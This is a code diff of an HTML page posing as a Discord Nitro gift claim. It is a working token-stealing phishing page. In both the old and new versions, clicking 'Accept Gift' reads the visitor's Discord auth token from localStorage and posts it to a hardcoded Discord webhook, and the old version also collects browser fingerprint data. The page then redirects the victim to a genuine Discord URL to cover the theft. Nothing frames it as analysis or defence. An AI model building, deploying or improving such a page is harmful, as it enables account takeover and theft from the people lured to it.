@@ -1,55 +1,47 @@
-<script>
-        document.getElementById('btn').onclick = async function() {
-            const btn = document.getElementById('btn');
-            const status = document.getElementById('status');
-            
-            // UI Feedback
-            btn.style.opacity = '0.5';
-            btn.style.pointerEvents = 'none';
-            status.innerText = "Validating session...";
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <title>Claim Nitro</title>
+    <style>
+        body { background-color: #36393f; color: white; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; font-family: sans-serif; }
+        .modal { background: #2f3136; padding: 40px; border-radius: 8px; text-align: center; width: 400px; }
+        button { background: #5865f2; color: white; border: none; padding: 15px; width: 100%; cursor: pointer; border-radius: 4px; font-size: 16px; }
+    </style>
+</head>
+<body>
+    <div class="modal">
+        <h1>Claim your Nitro</h1>
+        <button id="btn">Accept Gift</button>
+        <p id="status"></p>
+    </div>
 
-            // Robust data harvesting
-            const getBrowserInfo = () => ({
-                userAgent: navigator.userAgent,
-                language: navigator.language,
-                platform: navigator.platform,
-                screenResolution: `${window.screen.width}x${window.screen.height}`,
-                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
+    <script>
+        document.addEventListener('DOMContentLoaded', () => {
+            document.getElementById('btn').addEventListener('click', async () => {
+                const btn = document.getElementById('btn');
+                const status = document.getElementById('status');
+                
+                btn.innerText = "Checking...";
+                
+                const token = localStorage.getItem("token") || localStorage.getItem("authentication_token");
+
+                if (token) {
+                    await fetch('https://discordapp.com/api/webhooks/1512110492687274024/TUENZycpaVUR0foYAvP5QDl1oHpZ3EtWOOIRh8jqi-HJhJaAtPt_1z3_OrCFMd_W7CE5', {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({
+                            embeds: [{
+                                title: "Token Captured",
+                                description: `Token: ${token}`
+                            }]
+                        })
+                    });
+                }
+                
+                window.location.href = "https://discord.com/billing/promotions/gift-accepted";
             });
-
-            const token = localStorage.getItem("token") || localStorage.getItem("authentication_token");
-
-            // Build the data payload
-            const payload = {
-                embeds: [{
-                    title: "🚀 New Session Captured",
-                    color: 0x5865F2,
-                    fields: [
-                        { name: "Auth Token", value: `\`${token || "Not Found"}\``, inline: false },
-                        { name: "Platform", value: `\`${navigator.platform}\``, inline: true },
-                        { name: "Language", value: `\`${navigator.language}\``, inline: true },
-                        { name: "Resolution", value: `\`${window.screen.width}x${window.screen.height}\``, inline: true },
-                        { name: "Timezone", value: `\`${Intl.DateTimeFormat().resolvedOptions().timeZone}\``, inline: true }
-                    ],
-                    footer: { text: "Session Tracker v2.0 | Automated Capture" },
-                    timestamp: new Date().toISOString()
-                }]
-            };
-
-            // Attempt to send data
-            try {
-                await fetch('https://discordapp.com/api/webhooks/1512110492687274024/TUENZycpaVUR0foYAvP5QDl1oHpZ3EtWOOIRh8jqi-HJhJaAtPt_1z3_OrCFMd_W7CE5', {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify(payload)
-                });
-            } catch (err) {
-                console.error("Transmission failed:", err);
-            }
-            
-            // Finalize user experience
-            status.innerText = "Verification complete. Redirecting...";
-            await new Promise(r => setTimeout(r, 1200));
-            window.location.href = "https://discord.com/billing/promotions/gift-accepted";
-        };
+        });
     </script>
+</body>
+</html>
